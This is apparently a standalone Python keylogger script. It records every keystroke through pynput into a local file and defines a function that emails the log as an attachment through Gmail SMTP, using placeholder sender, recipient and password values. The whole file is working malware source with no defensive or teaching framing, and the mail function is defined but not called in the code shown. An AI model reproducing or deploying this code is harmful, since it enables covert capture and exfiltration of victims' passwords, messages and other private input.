'''f = open('file.txt', 'w')
f.write('adfgsfdgfh')
f.close()'''
# All imports
from pynput.keyboard import Listener #1
import smtplib #2
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import tempfile #3

# functions
def writetofile(key):
    char = str(key)
    char = char.replace("'", "")
    # replacing keystrokes in file.txt with actual meaning
    keystroke = ['Key.shift', 'Key.space', 'Key.enter', 'Key.backspace','Key.ctrl_l']
    value = ["", " ", "\n", '<backspace>', '']
    for j in range(len(keystroke)):
        if keystroke[j] == char:
            char = char.replace(keystroke[j], value[j])
    with open("file.txt", 'a') as f:
        f.write(char)
        
def emailsender():
    fromadd = "my_email"
    toadd = "my_email"

    msg = MIMEMultipart()

    msg['From'] = fromadd
    msg['To'] = toadd
    msg['Subject'] = 'Keylogger' # add subj here

    msg.attach(MIMEText('log', 'plain')) # wite body here

    filename = "file.txt" #extension imp
    attachment = open('file.txt', 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    smtpobj = smtplib.SMTP('smtp.gmail.com', 587)
    smtpobj.ehlo()
    smtpobj.starttls()
    smtpobj.login(fromadd ,'my_password') # add password 
    text = msg.as_string()
    smtpobj.sendmail(fromadd , toadd , text)
    smtpobj.quit()        

with Listener(on_press=writetofile) as l:
    l.join()
